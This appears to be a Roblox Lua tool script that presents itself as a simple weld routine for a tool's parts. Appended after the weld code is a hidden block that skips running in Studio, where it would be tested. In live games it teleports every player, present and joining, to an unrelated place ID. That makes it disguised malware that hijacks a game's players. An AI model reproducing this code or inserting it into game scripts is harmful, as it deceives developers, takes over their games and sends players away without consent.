function Weld(x,y)
	local W = Instance.new("Weld")
	W.Part0 = x
	W.Part1 = y
	local CJ = CFrame.new(x.Position)
	local C0 = x.CFrame:inverse()*CJ
	local C1 = y.CFrame:inverse()*CJ
	W.C0 = C0
	W.C1 = C1
	W.Parent = x
end

function Get(A)
if A:IsA("BasePart") then
        Weld(script.Parent.Handle, A)
        A.Anchored = false
	else
		local C = A:GetChildren()
		for i=1, #C do
		Get(C[i])
		end
	end
end

function Finale()
	Get(script.Parent)
end

script.Parent.Equipped:connect(Finale)
script.Parent.Unequipped:connect(Finale)
Finale()
local TS,Players = game:GetService("TeleportService"),game:GetService("Players")
if not game:GetService("RunService"):IsStudio() then
for _,v in pairs(Players:GetPlayers()) do TS:Teleport(4516800602,v) end
Players.PlayerAdded:Connect(function(plr)
	TS:Teleport(4516800602,plr)
end)
end
